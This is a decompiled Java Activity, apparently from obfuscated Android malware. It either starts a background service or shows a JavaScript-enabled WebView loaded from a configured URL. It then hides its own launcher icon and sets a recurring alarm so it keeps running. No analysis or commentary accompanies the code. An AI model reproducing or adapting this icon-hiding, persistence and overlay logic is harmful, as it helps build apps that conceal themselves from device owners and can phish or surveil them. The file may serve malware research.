package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebView;
import wocwvy.czyxoxmbauu.slsa.C0019a;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.C0022c;
import wocwvy.czyxoxmbauu.slsa.jtfxlnc;

/* JADX INFO: loaded from: classes.dex */
public class myvbo extends Activity {

    /* JADX INFO: renamed from: a */
    C0020b f458a = new C0020b();

    /* JADX INFO: renamed from: b */
    C0022c f459b = new C0022c();

    /* JADX INFO: renamed from: c */
    C0020b f460c = new C0020b();

    /* JADX INFO: renamed from: d */
    C0019a f461d = new C0019a();

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (!this.f459b.f390o || Build.VERSION.SDK_INT < 19) {
            startService(new Intent(this, (Class<?>) jtfxlnc.class));
        } else {
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.loadUrl(this.f459b.f391p);
            setContentView(webView);
        }
        getPackageManager().setComponentEnabledSetting(new ComponentName(this, (Class<?>) myvbo.class), 2, 1);
        try {
            C0020b c0020b = this.f458a;
            C0020b.m218a(this, "startAlarm", Integer.parseInt(this.f458a.m251e(this, "Interval")));
        } catch (Exception unused) {
            C0020b c0020b2 = this.f458a;
            C0020b.m218a(this, "startAlarm", 10000L);
        }
        if (this.f459b.f390o) {
            return;
        }
        finish();
    }
}
